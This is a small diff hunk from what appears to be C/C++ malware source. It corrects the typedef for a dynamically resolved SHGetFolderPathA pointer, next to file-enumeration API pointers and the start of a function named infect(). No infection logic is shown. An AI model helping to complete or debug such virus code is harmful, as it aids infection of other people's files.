@@ -99,7 +99,7 @@ typedef std::size_t (* strlenHeader)(const char *);
 typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
-typedef SHFOLDERAPI (* SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
+typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
 
 void infect(void)
 {
